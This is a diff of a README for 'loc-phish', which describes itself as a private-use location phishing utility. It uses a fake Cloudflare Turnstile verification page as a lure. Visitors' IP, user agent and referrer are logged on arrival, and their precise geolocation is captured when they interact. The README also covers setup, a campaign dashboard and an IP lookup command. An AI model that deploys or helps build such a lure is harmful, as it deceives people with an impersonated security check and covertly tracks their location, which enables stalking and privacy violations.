@@ -1,66 +1,53 @@
-## Getting Started
+<p align="center">
+  <strong>loc-phish</strong>
+</p>
+<p align="center">
+  Private-use location phishing utility.<br>
+  Cloudflare Turnstile verification page as redirect template.
+</p>
 
-### 1. Install Dependencies
+---
 
-```bash
-npm install
-```
-
-### 2. Configure Environment Variables
+## Setup
 
 ```bash
 cp .env.example .env.local
+npm install && npm run dev
 ```
 
-Edit `.env.local` and set `AUTH_PASSWORD` to your desired login password.
+Set `AUTH_PASSWORD` in `.env.local`, then visit `/login`.
 
-### 3. Run Development Server
+## Pages
 
-```bash
-npm run dev
+| URL | |
+|-----|-|
+| `/dashboard` | Campaigns + telemetry |
+| `/verify?s=<id>` or `/v/<slug>` | Turnstile redirect page |
+
+## Data
+
+Mock mode by default (`localStorage`). To persist, add to `.env.local`:
+
+```
+NEXT_PUBLIC_FIREBASE_API_KEY=
+NEXT_PUBLIC_FIREBASE_PROJECT_ID=
 ```
 
-- Dashboard: `http://localhost:3000/dashboard`
-- Login: `http://localhost:3000/login`
-- Turnstile page: `http://localhost:3000/verify?s=<sessionId>`
+## Scripts
 
-### 4. Build & Start Production
-
-```bash
-npm run build    # Build for production
-npm start        # Start production server
+```
+dev       npm run dev
+build     npm run build
+start     npm start
+check     npm run check
 ```
 
----
+## How it works
 
-## Scripts Reference
+Visitor hits the verify page → IP, rayId, UA, referrer logged immediately. Geolocation captures lat/lon/accuracy on interaction.
 
-| Command | Description | When to Use |
-|---------|-------------|-------------|
-| `npm run dev` | Start Next.js dev server with Turbopack | Development |
-| `npm run build` | Production build | Before deploying |
-| `npm start` | Start production server | Production |
-| `npm run typecheck` | Run TypeScript type checking | CI / Pre-commit |
-| `npm run lint` | Run ESLint on source files | CI / Pre-commit |
-| `npm run lint:fix` | Auto-fix ESLint issues | Before committing |
-| `npm run format` | Format all files with Prettier | Before committing |
-| `npm run format:check` | Check formatting without fixing | CI / Pre-commit |
-| `npm run check` | Run typecheck + lint + format check | CI / Pre-commit |
-| `npm run check:fix` | Auto-fix lint + format issues | Before committing |
-
-
----
-
-## Auth
-
-Login uses a password set via the `AUTH_PASSWORD` environment variable in `.env.local`. On successful login, the session is stored in `localStorage` (mock mode) or Firebase Auth (if configured).
-
----
-
-## IP Geolocation Lookup
-
-To query geolocation details for a recorded IP:
+Look up IP details:
 
 ```bash
-curl http://ip-api.com/json/<IP_ADDRESS>
+curl http://ip-api.com/json/<IP>
 ```
